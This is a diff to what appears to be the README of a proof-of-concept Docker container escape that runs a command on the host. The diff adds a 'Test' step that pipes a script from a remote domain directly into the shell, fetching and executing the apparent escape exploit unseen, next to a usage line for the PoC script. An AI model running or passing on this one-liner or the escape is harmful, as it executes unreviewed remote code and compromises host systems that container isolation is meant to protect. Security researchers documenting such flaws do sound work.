@@ -4,7 +4,11 @@
 
 Escape any Docker container with healthcheck enabled and run a command on the host.
 
-Usage:
+Test:
+```
+curl -L copyfail.avevad.com/docker.sh | sh
+```
+Use:
 ```
 ./poc.sh <HOST_COMMAND>
 ```
